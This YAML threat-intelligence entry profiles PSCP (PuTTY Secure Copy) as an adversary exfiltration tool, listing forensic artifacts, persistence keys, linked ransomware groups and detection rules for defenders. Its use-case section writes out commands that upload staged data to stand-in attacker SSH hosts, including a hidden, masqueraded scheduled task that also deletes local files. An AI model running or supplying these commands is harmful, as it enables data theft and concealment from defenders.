Name: PSCP
Description: |
  PSCP (PuTTY Secure Copy) is a lightweight command-line SCP client from the PuTTY suite
  used to copy files securely over SSH. Because it is a single, portable executable that
  supports encrypted transfers and common SSH authentication methods, adversaries frequently
  reuse PSCP to exfiltrate data to attacker-controlled SSH servers. PSCP's ubiquity, lack
  of installation requirement, and straightforward command-line usage make it attractive
  for stealthy, scriptable exfiltration workflows.
Category: third-party
Platform:
  - Windows
  - Linux
Execution:
  - cli
Capabilities:
  - secure-file-transfer      # encrypted transfer using SSH/SCP
  - non-interactive-usage     # supports key-based auth and scripted invocation
  - recursive-transfer       # recursive copy of directories (e.g., -r)
  - custom-port              # ability to use non-standard SSH ports
  - quiet-mode               # suppress verbose output for stealth
Stealth:
  - portable-executable      # single-file binary runnable from any path
  - key-based-authentication # avoid interactive password prompts
  - non-standard-port        # use of non-22 ports to evade simple filters
  - run-from-user-paths      # execution from %TEMP% or %APPDATA% to blend in
Forensics:
  BinaryLocations:
    - 'C:\Program Files\PuTTY\pscp.exe'
    - 'C:\Windows\System32\pscp.exe'
    - '/usr/bin/pscp'
    - '/usr/local/bin/pscp'
    - '%USERPROFILE%\AppData\Local\Temp\pscp.exe'
  FileNamePatterns:
    - pscp.exe
    - pscp32.exe
    - pscp64.exe
  CommandLineArgs:
    - '-r'                     # recursive copy of directories
    - '-P'                     # custom SSH port (e.g., -P 2222)
    - '-pw'                    # password on command line (suspicious)
    - '-i'                     # private key file for key-based auth
    - '-scp'                   # enforce scp protocol (when applicable)
  ConfigFiles:
    - '%USERPROFILE%\.ssh\id_rsa'            # common private key used to authenticate
    - '%USERPROFILE%\.ssh\known_hosts'       # SSH known hosts entries to obscure destinations
    - '~/.ssh/id_rsa'
    - '~/.ssh/known_hosts'
  ScheduledTask:
    - Name: PSCP_Exfil_Task
      Description: Scheduled task used to run PSCP periodically to upload collected archives.
      Command: 'powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\run_pscp.ps1'
    - Name: SystemMaintenance
      Description: Masqueraded scheduled task that runs an exfiltration script using PSCP.
      Command: 'schtasks /run /tn "SystemMaintenance"'
  RegistryPersistence:
    - 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\pscp_updater'
    - 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run\pscp_service'
  LogFiles:
    - 'C:\Users\<user>\pscp.log'
    - '%TEMP%\pscp-transfer.log'
  NetworkArtifacts:
    - 'Outbound SSH sessions to uncommon IPs or ports (tcp/22 or custom port)'
    - 'One-off or short-lived SSH connections immediately following archive creation'
    - 'High bytes_out associated with scp sessions'
ThreatActors:
  - alphv            # BlackCat/ALPHV
  - lockbit
  - conti
  - generic-ransomware
References:
  - 'https://www.trendmicro.com/en_us/research/23/f/malvertising-used-as-entry-vector-for-blackcat-actors-also-lever.html'
  - 'https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/'
  - 'https://the.earth.li/~sgtatham/putty/latest/htmldoc/Chapter5.html'  # PuTTY / PSCP docs
UseCases:
  - Title: Simple file upload to attacker SSH server
    Description: Upload a single file to a remote SSH server using username@host:path.
    Command: |
      pscp.exe C:\Staged\secret.zip attacker@1.2.3.4:/home/attacker/exfil/secret.zip
  - Title: Recursive directory upload
    Description: Recursively copy an entire folder to a remote host (useful for bulk exfiltration).
    Command: |
      pscp.exe -r C:\Staged\Data attacker@1.2.3.4:/home/attacker/exfil/data
  - Title: Non-standard port and key-based auth (scripted)
    Description: Use a private key and a custom SSH port to avoid standard-port detection.
    Command: |
      pscp.exe -i C:\Users\Public\id_rsa -P 2222 C:\Staged\*.zip attacker@sshhost.example:/incoming/
  - Title: Silent execution via PowerShell scheduled task
    Description: Task executes PSCP to transfer files, then optionally cleans up local artifacts.
    Command: |
      schtasks /Create /SC HOURLY /TN "SystemMaintenance" /TR "powershell -WindowStyle Hidden -Command 'Start-Process -FilePath C:\Temp\pscp.exe -ArgumentList ''-r C:\Staged attacker@1.2.3.4:/exfil'' -NoNewWindow -Wait; Remove-Item C:\Staged\* -Force'"
Detection:
  - Type: Process/Path Anomaly
    Description: Alert on pscp.exe (or suspiciously named pscp-like binaries) executed from non-standard locations (e.g., %TEMP%, %APPDATA%, user Desktop) or when the binary name is unusual for the host.
  - Type: Command-Line Pattern
    Description: Detect use of recursive (-r), custom port (-P), key-based (-i) or password-on-cmdline (-pw) flags combined with remote host destinations and large byte transfer.
  - Type: Parent/Launcher Anomaly
    Description: Flag pscp.exe started by non-interactive parents (e.g., wscript/cscript, mshta, scheduled task, or unknown service) or launched by interpreters (powershell.exe/cmd.exe) in suspicious contexts.
  - Type: Network Correlation
    Description: Correlate process creation with outbound SSH connections to IPs that are rare or never-before-seen for the environment (including use of non-22 ports).
  - Type: Data Volume
    Description: Alert when pscp-related process exhibits large bytes_out shortly after file-collection/archival activity (.zip/.7z creation).
  - Type: Persistence & Hygiene
    Description: Detect creation of scheduled tasks or Run keys that reference pscp or scripts invoking pscp, and file cleanup immediately after successful transfers.
Tags:
  - stealth
  - third-party
  - cli
  - secure-transfer
  - commonly-used
